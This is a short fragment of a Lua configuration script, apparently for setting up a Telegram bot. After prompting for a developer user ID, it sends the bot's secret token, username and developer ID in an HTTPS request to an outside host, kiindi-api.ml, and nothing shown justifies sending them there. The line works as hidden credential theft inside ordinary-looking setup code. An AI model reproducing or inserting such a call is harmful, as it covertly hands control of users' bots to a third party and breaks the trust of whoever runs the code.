...
if SUDO_USER == '' then
print('\n\27[1;31m￤ You Did not Enter USERID !\n￤يرجى التركيز وادخال ايدي المطور الاساسي ')
create_config(Token)
end 
...
https.request('kiindi-api.ml/lua/nizk/elnizk.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
